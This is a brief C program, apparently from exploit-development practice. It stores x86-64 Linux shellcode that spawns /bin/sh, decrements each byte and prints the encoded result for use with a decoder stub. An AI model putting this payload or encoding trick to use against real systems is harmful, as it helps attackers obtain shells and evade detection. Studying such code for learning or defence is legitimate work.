#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] = "\x48\x31\xd2\x48\x31\xf6\x48\x31\xc0\x48\x31\xff\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05";


int main(int argc, char **argv) {
	int i;
	printf("Size: %lu\n", sizeof(shellcode));
	for (i = 0; i < (sizeof(shellcode) - 1); i++) {
		shellcode[i]--;
		printf("\\x%02x", shellcode[i]);
	}


	return 0;


}
